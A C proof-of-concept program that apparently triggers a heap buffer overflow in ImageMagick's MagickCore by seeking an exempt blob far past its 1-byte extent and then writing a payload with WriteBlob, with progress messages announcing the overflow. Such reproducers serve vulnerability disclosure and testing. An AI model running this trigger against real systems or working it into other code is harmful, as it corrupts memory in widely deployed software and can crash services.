#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <MagickCore/MagickCore.h>
#include <MagickCore/blob.h>
#include "MagickCore/blob-private.h"

int main(int argc, char **argv) {
    MagickCoreGenesis(argv[0], MagickTrue);
    
    ExceptionInfo *exception = AcquireExceptionInfo();
    ImageInfo *image_info = AcquireImageInfo();
    Image *image = AcquireImage(image_info, exception);
    
    if (!image) {
        fprintf(stderr, "[-] Failed to create image\n");
        return 1;
    }
    
    unsigned char *buf = (unsigned char *)malloc(1);
    buf[0] = 0x41;
    AttachBlob(image->blob, buf, 1);
    SetBlobExempt(image, MagickTrue);
    
    fprintf(stdout, "[+] Initial state: offset=0, extent=1\n");
    fflush(stdout);
    
    unsigned char data = 0x42;
    WriteBlob(image, 1, &data);
    fprintf(stdout, "[+] After write 1 byte: offset=%lld, extent=%zu\n",
            (long long)TellBlob(image), (size_t)GetBlobSize(image));
    fflush(stdout);
    
    MagickOffsetType big_offset = (MagickOffsetType)0x10000000;  // 256 MiB
    SeekBlob(image, big_offset, SEEK_SET);
    fprintf(stdout, "[+] After seek to 256MiB: offset=%lld, extent=%zu\n",
            (long long)TellBlob(image), (size_t)GetBlobSize(image));
    fprintf(stdout, "[!] CRITICAL: offset >> extent, next write will overflow!\n");
    fflush(stdout);
    
    const unsigned char payload[] = "OVERFLOW";
    fprintf(stdout, "[*] Triggering heap overflow with WriteBlob()...\n");
    fflush(stdout);
    
    WriteBlob(image, sizeof(payload), payload);
    
    fprintf(stdout, "[-] No crash occurred (unexpected)\n");
    
    CloseBlob(image);
    DestroyImage(image);
    DestroyImageInfo(image_info);
    DestroyExceptionInfo(exception);
    MagickCoreTerminus();
    
    return 0;
}
